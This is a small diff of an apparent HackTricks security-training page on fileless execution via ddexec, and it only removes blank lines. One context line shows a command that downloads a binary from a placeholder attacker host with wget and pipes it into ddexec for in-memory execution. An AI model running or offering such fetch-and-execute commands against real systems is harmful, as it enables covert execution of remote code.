@@ -2,7 +2,6 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-
 ## Videos
 
 In the following videos you can find the techniques mentioned in this page explained more in depth:<sup>[[1]](#references)[[2]](#references)</sup>
@@ -68,7 +67,6 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 ```
 
 For more information about this technique check the Github or:
-
 
 {{#ref}}
 ddexec.md
